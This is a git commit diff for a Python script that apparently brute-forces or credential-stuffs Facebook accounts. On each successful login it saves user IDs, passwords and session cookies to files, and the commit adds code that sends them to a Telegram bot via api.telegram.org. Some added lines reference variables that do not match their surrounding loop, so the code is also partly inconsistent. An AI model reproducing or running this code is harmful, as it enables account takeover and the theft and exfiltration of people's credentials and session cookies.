2154d12e372561bd82805520838c5824814896dc
tessterr <168154763+tessterr@users.noreply.github.com>
2024-06-29 21:52:02 +0530

    Update test1.py

--- test1.py
+++ test1.py
@@ -1345,17 +1345,15 @@ def m6(idf,pwv):
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
-    url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
+    url = f"https://graph.facebook.com/{user}/picture?type=normal"
     reqx = requests.get(url).text
-    if 'live' in reqx:
+    if 'Photoshop' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             statusok = (f" {user} | {ps} | {coki} ")
             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
             ok+=1 
-            f'''datr={''.join(random.choices(string.ascii_letters + string.digits + '_', k = 24))};'''
-            'True'
             break
     if 'lock' in reqx:
             print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
@@ -1444,8 +1442,9 @@ def m7(idf,pwv):
                     if 'Photoshop' in res:
                             print('\r\r\033[1;32m[atom-OK] '+uid+' | '+pw)
                             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {cookie}\33[1;36m")
-                            print(f"\r\033[38;5;190mCOOKIES=[UA]: {useragent}\33[1;36m")
-                            open('/sdcard/ATOM-M4-live-OK.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+                            statusok = (f" {user} | {ps} | {coki} ")
+                            open('/sdcard/ATOM-M7-live-OK.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+                            requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                             ok+=1
                             break 
                     elif 'www.facebook.com' in q['error']['message']:
@@ -1528,8 +1527,9 @@ def m8(idf,pwv):
                     if 'Photoshop' in res:
                             print('\r\r\033[1;32m[atom-OK] '+uid+' | '+pw)
                             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {cookie}\33[1;36m")
-                            print(f"\r\033[38;5;190mCOOKIES=[UA]: {useragent}\33[1;36m")
-                            open('/sdcard/ATOM-M4-live-OK.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+                            open('/sdcard/ATOM-M8-live-OK.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+                            statusok = (f" {user} | {ps} | {coki} ")
+                            requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                             ok+=1
                             break 
                     elif 'www.facebook.com' in q['error']['message']:
